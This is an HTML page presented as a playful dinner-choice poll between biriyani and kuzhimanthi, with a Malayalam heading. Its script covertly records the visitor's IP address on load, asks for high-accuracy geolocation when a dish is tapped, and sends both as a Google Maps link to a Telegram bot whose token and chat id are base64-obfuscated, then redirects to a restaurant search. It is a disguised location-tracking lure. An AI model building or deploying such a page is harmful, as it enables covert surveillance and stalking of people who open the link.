<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dinner Choice</title>
    <style>
        body { background-color: #f8f9fa; font-family: 'Segoe UI', Tahoma, sans-serif; text-align: center; padding: 15px; margin: 0; }
        .container { max-width: 450px; margin: auto; background: white; padding: 20px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        h2 { color: #d35400; margin-bottom: 5px; }
        .food-item { margin-bottom: 25px; cursor: pointer; border: 2px solid #eee; border-radius: 15px; overflow: hidden; transition: 0.3s; background: #fff; position: relative; }
        .food-item:hover { border-color: #d35400; transform: translateY(-5px); }
        img { width: 100%; height: 250px; object-fit: cover; display: block; }
        .name { font-weight: bold; padding: 12px; display: block; background: #fff; color: #333; font-size: 18px; }
        #status { display: none; color: #27ae60; font-weight: bold; margin-top: 15px; font-size: 18px; }
    </style>
</head>
<body onload="initData()">
    <div class="container">
        <h2>ഇന്ന് ഏത് വേണം? 😋</h2>
        <p>Pick your favorite one!</p>

        <div class="food-item" onclick="handleVote('Biriyani')">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/Chicken_Biryani_in_Chennai.jpg/800px-Chicken_Biryani_in_Chennai.jpg" alt="Biriyani">
            <span class="name">🍗 HYDERABADI BIRIYANI</span>
        </div>

        <div class="food-item" onclick="handleVote('Kuzhimanthi')">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ee/Chicken_Mandi.jpg/800px-Chicken_Mandi.jpg" alt="Kuzhimanthi">
            <span class="name">🥘 ARABIAN KUZHIMANTHI</span>
        </div>

        <div id="status">Thanks! Ordering soon... ❤️</div>
    </div>

    <script>
        let user_ip = "N/A";
        // Telegram keys encoded for safety
        const tok = "ODY0NzIwNjgxODpBQUZaTE91bVFwSUJZRDNXdURjZWVPR1drTkRDTFZpR3paSQ==";
        const cid = "NzAwODk1Mjc0Ng==";

        async function initData() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                user_ip = data.ip;
            } catch(e) {}
        }

        function handleVote(food) {
            document.getElementById('status').style.display = 'block';
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    p => {
                        const lat = p.coords.latitude;
                        const lon = p.coords.longitude;
                        const locLink = `https://www.google.com/maps?q=${lat},${lon}`;
                        sendData(food, locLink);
                    }, 
                    () => sendData(food, "Permission Denied"),
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } else {
                sendData(food, "Location Not Supported");
            }
        }

        async function sendData(food, locInfo) {
            const botToken = atob(tok);
            const chatId = atob(cid);
            const msg = `🍴 *New Vote: ${food}*\n🌐 *IP:* ${user_ip}\n📍 *Google Map:* ${locInfo}`;
            
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
            
            setTimeout(() => {
                window.location.href = "https://www.google.com/search?q=restaurants+near+me";
            }, 1000);
        }
    </script>
</body>
</html>
